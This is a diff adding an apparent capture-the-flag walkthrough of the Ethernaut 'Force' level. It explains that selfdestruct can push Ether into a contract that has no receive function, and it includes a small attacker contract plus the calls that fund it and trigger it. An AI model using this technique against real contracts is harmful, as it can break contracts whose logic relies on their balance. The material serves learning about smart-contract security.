@@ -405,3 +405,64 @@ success;
 
 * https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#delegatecall-and-libraries
 * https://solidity-by-example.org/delegatecall/
+
+## 07 Force
+
+To beat this level, we need to comply with
+
+```solidity
+address(instance).balance > 0
+```
+
+### Solution
+
+Right. This is the contract, BTW.
+
+```solidity
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+```
+
+Without a `receive()` function, looks like we are in trouble.
+
+Enter `selfdestruct()`:
+
+> The only way to remove code from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state. Removing the contract in theory sounds like a good idea, but it is potentially dangerous, as if someone sends Ether to removed contracts, the Ether is forever lost.
+
+So, what we want to do is creating some contract with value on it, and `selfdestruct`it, making sure we give this level address as the destination of whatever funds it holds.
+
+```solidity
+contract ForceAttack {
+  function byebye(address payable _dest) public {
+    selfdestruct(_dest);
+  }
+
+  receive() external payable {}
+
+}
+```
+
+Then we create the first contract, giving it `1 wei`.
+
+```solidity
+(bool success,) = address(attackerContract).call{value: 1 wei}("");
+success;
+```
+
+And invoke the attack at `ForceAttack.byebye()`
+
+```
+attackerContract.byebye(payable(challengeAddress));
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
+* https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#deactivate-and-self-destruct
